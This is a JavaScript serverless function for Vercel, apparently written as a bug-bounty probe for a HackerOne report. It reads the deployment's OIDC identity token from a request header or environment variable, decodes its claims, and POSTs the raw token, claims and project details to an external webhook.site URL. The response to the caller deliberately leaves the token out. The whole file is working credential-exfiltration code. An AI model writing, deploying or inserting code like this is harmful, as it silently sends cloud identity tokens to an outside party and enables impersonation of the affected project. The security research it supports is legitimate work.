// Runtime probe for HackerOne report #4086036.
// Destination is the researcher's own webhook.site inbox.
const WEBHOOK = "https://webhook.site/a72ec3e3-e006-423e-bf2d-333bccfc0392";

export default async function handler(req, res) {
  // In Vercel Functions the OIDC token is delivered as a request header;
  // VERCEL_OIDC_TOKEN is a BUILD-time / local-development variable.
  const headerToken = req.headers["x-vercel-oidc-token"];
  const token = headerToken || process.env.VERCEL_OIDC_TOKEN || "NOT_AVAILABLE";
  const env = process.env.VERCEL_ENV || "NOT_SET";
  const projectId = process.env.VERCEL_PROJECT_ID || "NOT_SET";

  let claims = null;
  if (token !== "NOT_AVAILABLE") {
    try {
      claims = JSON.parse(Buffer.from(token.split(".")[1], "base64url").toString("utf8"));
    } catch {
      claims = null;
    }
  }

  try {
    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        phase: "runtime",
        source: headerToken ? "x-vercel-oidc-token" : token !== "NOT_AVAILABLE" ? "env" : "none",
        oidcToken: token,
        claims,
        projectId,
        vercelEnv: env,
        timestamp: new Date().toISOString()
      }),
      signal: AbortSignal.timeout(8_000)
    });
  } catch {
    // best effort only
  }

  // The response intentionally never carries the raw token.
  res.status(200).json({
    ok: true,
    env,
    projectId,
    tokenPresent: token !== "NOT_AVAILABLE",
    tokenSource: headerToken
      ? "x-vercel-oidc-token"
      : token !== "NOT_AVAILABLE"
        ? "VERCEL_OIDC_TOKEN"
        : "none"
  });
}
